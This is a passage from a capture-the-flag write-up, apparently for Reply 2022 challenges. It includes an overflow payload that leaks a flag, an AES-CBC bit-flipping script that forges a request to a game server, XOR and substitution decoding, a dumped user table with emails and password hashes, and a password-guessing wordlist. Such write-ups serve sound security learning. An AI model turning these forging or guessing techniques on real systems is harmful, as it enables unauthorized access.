<span class="line"><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*0x</span><span style="color:#4C9A91">3F8</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x01</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> struct</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pack</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">&#x3C;B</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">send_message</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">get_dimension_info</span><span style="color:#666666">())</span></span>
<span class="line"></span></code></pre>
<p>The result is:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D"> sELECTED: 8001</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">{"code":"A2MP_GETINFO_RSP", "id": "1", "status: 0x1", "total_bw: 0", "max_bw: 0", "min_latency: 0", "pal_cap: 0", "assoc_size: 0", "flg: {FLG:~wh04_inf0134k_ch4mpi0n~}"}</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">'</span></span>
<span class="line"></span></code></pre>
<h2 id="crypto-35">Crypto (3/5)</h2>
<h3 id="crypto-100">Crypto 100</h3>
<p>We were given a <strong>pdf file</strong> containing an image of a lair of some sort and 3 QR codes. First thing to do is obviously read the QR’s, which gave us three 32-bytes strings, but then we needed to know what to do with them.
At the beginning of the challenge we didn’t know what a NFT was, so… we tried to guess some operation on these strings, but nothing made sense.
After too much useless guesses I started googleing the challenge title and discovered what we had been given.
On the site <a href="https://goerli.etherscan.io/">https://goerli.etherscan.io/</a> we found three transactions with the IDs we had previously found, and finally each of them led us to an image of a Rune.
It was nothing like Tolkien elvish nor Viking runes, it was probably autogenerated with AI, so we started checking the image files with <code>binwalk</code> or <code>exiftool</code> with no results. At last we guessed that they had nothing to do with the challenge and took a better look at the transactions’ parties.
The sender did another transaction just before the others, so we searched in it. We used CyberChef to decode the contract, which looked exactly like the others.
Fortunately, serching all of the strings, we found the flag at the end!</p>
<h3 id="crypto-200">Crypto 200</h3>
<p>The challenge gives us the parameters of a GET request encrypted with AES-CBC and wants us to forge a new one with a different username. The last block is just padding so we can do a bitflip attack xoring the previous block with  the result of <code>xor(b"\x10"*16, f"&#x26;user={username}".encode().ljust(16, b"\x00"))</code>
After trying every possible username we could come up with, we gave another look at <code>note.txt</code>, which had an interesting message:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span># challenge title</span></span>
<span class="line"><span>Don't forget the best bits</span></span>
<span class="line"><span></span></span>
<span class="line"><span># examples</span></span>
<span class="line"><span>Cleartext: message%3DFor%20a%20fullfilling%20experience%20embrace%20listen%20to%20new%20music%2E%20Pay%20attention%20to%20details%2C%20titles%20are%20important%2E%20And%20remember%2C%20music%20it%27s%20flipping%20amazing%26user%3Dmario</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[...]</span></span>
<span class="line"><span></span></span></code></pre>
<p>We unquoted the cleartext just to make it more readable:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">>>></span><span style="color:#4D9375"> from</span><span style="color:#DBD7CAEE"> urllib</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">parse </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> unquote</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">>>></span><span style="color:#DBD7CAEE"> unquote</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">message%3DFor</span><span style="color:#C99076">%20a%20f</span><span style="color:#C98A7D">ullfilling</span><span style="color:#C99076">%20e</span><span style="color:#C98A7D">xperience</span><span style="color:#C99076">%20e</span><span style="color:#C98A7D">mbrace</span><span style="color:#C99076">%20li</span><span style="color:#C98A7D">sten%20to%20new%20music</span><span style="color:#C99076">%2E</span><span style="color:#C98A7D">%20Pay</span><span style="color:#C99076">%20a</span><span style="color:#C98A7D">ttention%20to</span><span style="color:#C99076">%20d</span><span style="color:#C98A7D">etails%2C%20titles</span><span style="color:#C99076">%20a</span><span style="color:#C98A7D">re</span><span style="color:#C99076">%20i</span><span style="color:#C98A7D">mportant</span><span style="color:#C99076">%2E</span><span style="color:#C98A7D">%20And</span><span style="color:#C99076">%20r</span><span style="color:#C98A7D">emember%2C%20music</span><span style="color:#C99076">%20i</span><span style="color:#C98A7D">t</span><span style="color:#C99076">%27s%20f</span><span style="color:#C98A7D">lipping</span><span style="color:#C99076">%20a</span><span style="color:#C98A7D">mazing</span><span style="color:#C99076">%26u</span><span style="color:#C98A7D">ser%3Dmario</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">message=For a fullfilling experience embrace listen to new music. Pay attention to details, titles are important. And remember, music it's flipping amazing&#x26;user=mario</span><span style="color:#C98A7D77">"</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">>>></span><span style="color:#DBD7CAEE"> </span></span>
<span class="line"></span></code></pre>
<p>This clearly meant that the challenge title was somehow going to tell us the username, and it must be something related to music.
We searched “don’t forget the best bits” on Google and one of the first results was the lyrics to a song by Franz Ferdinand: <a href="https://genius.com/Franz-ferdinand-billy-goodbye-lyrics">https://genius.com/Franz-ferdinand-billy-goodbye-lyrics</a>.
The title of the song was “Billy Goodbye”. We were desperate, so we tried “billy” as the username, and unexpectedly we got the flag.</p>
<p>Final script:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> requests </span><span style="color:#4D9375">as</span><span style="color:#DBD7CAEE"> r</span></span>
<span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> urllib</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">parse </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> quote</span></span>
<span class="line"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> Crypto</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Util</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Padding </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> pad</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> xor</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">a</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> b</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> c</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">([</span><span style="color:#DBD7CAEE">x </span><span style="color:#CB7676">^</span><span style="color:#DBD7CAEE"> y </span><span style="color:#CB7676">^</span><span style="color:#DBD7CAEE"> z </span><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> z </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> zip</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">a</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> b</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> c</span><span style="color:#666666">)])</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">ctx </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">fromhex</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">482c74deadaee362185c315aa10bcd02c96d2417fe3d1adf7fd90da2da95ca16ff9bb7b20b1ed3ac22c93bd3ac7f8d790768379407181f93bbc2c5bde5da5a4e47b400ed0827d815c47b4793349d894a557dd4436a7e2d7967b09faeff6b7037e5ba40202e850c0640414ffd651847bff2fe50ac248ac63cd595339b6fa9ee78f2835d29176d524ab9116894eab6ad5fd56c6600670d1f5bc4e48dfdaed740d1e3b3f1c05a067fbeb69e0a67226755569f185120d5b393131ecd3c209123994135a62d029cc5072264cd6ca306a7d1fc8a63ae9b9675ecace48745f049d5d742639e2df80675ad114938eb641a8b1704</span><span style="color:#C98A7D77">"</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#666666">(</span><span style="color:#DBD7CAEE">ctx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> to_edit</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> last_block</span><span style="color:#666666">)</span><span style="color:#666666"> =</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">ctx</span><span style="color:#666666">[:</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">32</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> ctx</span><span style="color:#666666">[</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">32</span><span style="color:#666666">:</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">16</span><span style="color:#666666">],</span><span style="color:#DBD7CAEE"> ctx</span><span style="color:#666666">[</span><span style="color:#CB7676">-</span><span style="color:#4C9A91">16</span><span style="color:#666666">:])</span></span>
<span class="line"><span style="color:#DBD7CAEE">ptx </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pad</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">quote</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">""</span><span style="color:#666666">).</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">unicode_escape</span><span style="color:#C98A7D77">'</span><span style="color:#666666">),</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">,</span><span style="color:#BD976A"> style</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">pkcs7</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">user </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">billy</span><span style="color:#C98A7D77">"</span></span>
<span class="line"><span style="color:#DBD7CAEE">target </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pad</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"&#x26;user=</span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">user</span><span style="color:#C99076">}</span><span style="color:#C98A7D">"</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">(),</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">,</span><span style="color:#BD976A"> style</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">pkcs7</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">target</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">to_edit </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> xor</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">to_edit</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ptx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> target</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">ctx </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ctx </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> to_edit </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> last_block</span></span>
<span class="line"><span style="color:#4D9375">assert</span><span style="color:#B8A965"> len</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">ctx</span><span style="color:#666666">)</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 240</span></span>
<span class="line"><span style="color:#DBD7CAEE">res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> r</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">post</span><span style="color:#666666">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">http://gamebox1.reply.it/14de018c45487063d3bc11fe33ac7e6996914988/</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> data</span><span style="color:#666666">={</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">ciphertext</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE"> ctx</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#666666">()})</span></span>
<span class="line"><span style="color:#B8A965">print</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">res</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">content</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<h3 id="crypto-300">Crypto 300</h3>
<p>The challenge gives us an unspecified 5MB file.</p>
<p><code>file</code> tells us nothing. We opened the file with a hex editor, and noticed that there were several repeated sequences of bytes like <code>'\xaa\xbb\xcc\xdd</code>. Since this is a Reply crypto challenge with no source code, we guessed this was probably a repeated XOR. We quickly decoded the actual file:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#CB7676">def</span><span style="color:#80A665"> xor</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">([</span><span style="color:#DBD7CAEE">a</span><span style="color:#CB7676">^</span><span style="color:#DBD7CAEE">b </span><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> a</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> b </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> zip</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> y</span><span style="color:#666666">)])</span></span>
<span class="line"><span style="color:#4D9375">with</span><span style="color:#B8A965"> open</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">challenge</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">    s </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read</span><span style="color:#666666">()</span></span>
<span class="line"><span style="color:#4D9375">with</span><span style="color:#B8A965"> open</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">challenge2</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">wb</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">    f</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">write</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">xor</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">s</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\xaa\xbb\xcc\xdd</span><span style="color:#C98A7D77">'</span><span style="color:#CB7676">*</span><span style="color:#4C9A91">10</span><span style="color:#CB7676">**</span><span style="color:#4C9A91">7</span><span style="color:#666666">))</span></span>
<span class="line"></span></code></pre>
<p>We got what looked to be a disk image, so we mounted it and we saw a few of files.
One of these files was <code>hint.txt</code>, which contained the following text:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>The key to open the zip file is a compound word.</span></span>
<span class="line"><span>The first word is found within the sqlite file, the second is the maiden name of the lady in the picture.</span></span>
<span class="line"><span></span></span></code></pre>
<p>So we had to somehow decode the picture and read the contents of the sqlite file in order to decrypt the <code>rsa.zip</code> archive.</p>
<p>Another file in the archive is a pickle object (<code>dict.pkl</code>). Opening it in a Python REPL shows that the content is a single dictionary, with a bijective mapping from 0-255 to 0-255. Since this is a Reply crypto challenge with no source code, we guessed this is probably used for a byte-to-byte substitution cipher.</p>
<p>The picture mentioned by the hint is a noisy grayscale BMP image. Grayscale is represented well with a single byte per pixel, so we guessed this was encrypted with the pickle dictionary. We recovered the image with Pillow:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">from</span><span style="color:#C99076"> PIL</span><span style="color:#4D9375"> import</span><span style="color:#DBD7CAEE"> Image</span></span>
<span class="line"><span style="color:#DBD7CAEE">im </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> Image</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">open</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">portrait.bmp</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">with</span><span style="color:#B8A965"> open</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">dict.pkl</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">rb</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> f</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">    sub </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pickle</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">load</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">f</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> sub</span><span style="color:#666666">:</span></span>
<span class="line"><span style="color:#DBD7CAEE">    rev</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">sub</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">]]</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> x</span></span>
<span class="line"><span style="color:#DBD7CAEE">new </span><span style="color:#666666">=</span><span style="color:#B8A965"> bytes</span><span style="color:#666666">([</span><span style="color:#DBD7CAEE">rev</span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">]</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> im</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">tobytes</span><span style="color:#666666">()])</span></span>
<span class="line"><span style="color:#DBD7CAEE">newimage </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> Image</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">frombytes</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">L</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> im</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">size</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> new</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>We got to this image:
![]({{ site.baseurl }}/writeup_files/reply2022/images/F7YOswy.png)
Which, with a quick Reverse Image Search, we found out to be Ozzy Osbourne’s mother, Lillian Unitt.</p>
<p>To read the sqlite database, we just installed sqlite, opened it with <code>sqlite3 mywonderfulwebapp</code>, read the schema with <code>.schema</code>, read the contents with <code>SELECT * FROM users;</code>.</p>
<p>So the contents of the sqlite file are:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>1|anonymouse|ddrussery@emailaing.com|592f3eab7921a05e13f89713e5d38953a1e91377dce316feeddafec6e79210a0|1948-12-03</span></span>
<span class="line"><span>2|regina_phalange|marselmannanov@tqc-sheen.com|db3fe1d185a9de6df0f026bd269302acb5f7783d8474a9382f96a7e914f397ef|1952-10-09</span></span>
<span class="line"><span>3|potatoxchipz|t2003cubs@nautonk.com|dfa21928c1d4af9ec27d927b68bd665af1360297a81d31799ee5e84f333b59fa|1984-10-27</span></span>
<span class="line"><span>4|churros4eva|mojdom@saxophonexltd.com|7ec802283374aed5389db2fc4aac488e6e799bbcdd2c8ed5a0c6a080cf2604dc|1985-11-08</span></span>
<span class="line"><span>5|hakuna_matata|joechu@omdiaco.com|2c671d707baa7b47a037f9df07fbe9eb632b6f8387f177eab188a3d89c874a77|1963-05-25</span></span>
<span class="line"><span>6|kokonuts|michadav@hungta2.com|f19b7f5f22152b693819b5a3cb3255b48deb89b24380cf6c961cf614fbcbc8f6|1933-03-14</span></span>
<span class="line"><span>7|notfunnyatall|n96237d@cudimex.com|8d0cfd6182ef851052565eb5c11e79f73c691307f7b6ddb877b4303cc726f260|1930-02-10</span></span>
<span class="line"><span>8|cereal_killer|barbyoropeza@24hinbox.com|b5bafafc8a5142819ae993d0cc2abb1e21e617476bc5776e87587bfde365ec37|1974-02-08</span></span>
<span class="line"><span>9|heisenberg_blue|shaneyreid91@yt-google.com|458884f76578e91da700f786b5fae22afc4ff401b0b6642257e111160e38279f|1953-07-11</span></span>
<span class="line"><span>10|hackmarco|assuero@maintenances.us|eee6264c2bdc34894da6da5423d7a70f9cd8bfd36adb1cbcec56ab054fd6e4aa|1969-01-01</span></span>
<span class="line"><span>11|nombnots|pawol69087@ekbasia.com|8a8b3febf641c615702c17731e0ca85896b27a331f33e95bc8b436b7e1a949f5|1988-02-10</span></span>
<span class="line"><span>12|chunkamunk|cityve@lyricspad.net|74a05867a8215ffe1f28abeafbb626fdec46743276a9e937fcb42c6e5dc337f8|1991-03-23</span></span>
<span class="line"><span>13|monkey_butt|mudraporko@vusra.com|0d95887bd691678043195f1644efcde7312b71f6d4216a6aeb6bd7e30cfc5dd6|1979-06-22</span></span>
<span class="line"><span>14|screwball|lucumazu@teleg.eu|fbebd681120a1fc8906c5593f07265669d9130cbc06fdc08a7a30b08d24437de|1983-08-28</span></span>
<span class="line"><span>15|troublemaker|nusavufi@kellychibale-researchgroup-uct.com|9f13deb22cc66b56291845890646590c57b5d6d9108e9b2d9d46365d189aa271|1966-06-06</span></span>
<span class="line"><span></span></span></code></pre>
<p>Since we had a lot of combinations to try, we wrote a script that would try all of them:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#758575DD">#!/usr/bin/env python3</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> pyzipper</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">words </span><span style="color:#666666">=</span><span style="color:#666666"> [</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">anonymouse</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">mouse</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">regina_phalange</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">regina</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">phalange</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">potatoxchipz</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">potato</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">chipz</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">churros4eva</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">churros</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">eva</span><span style="color:#C98A7D77">'</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">hakuna_matata</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">hakuna</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">matata</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">kokonuts</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">nuts</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">notfunnyatall</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">not</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">funny</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">at</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">all</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">cereal_killer</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">cereal</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">killer</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">heisenberg_blue</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">heisenberg</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">blue</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">hackmarco</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">hack</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">marco</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">nombnots</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">chunkamunk</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">monkey_butt</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">monkey</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">butt</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#C98A7D77">    '</span><span style="color:#C98A7D">screwball</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span></span>
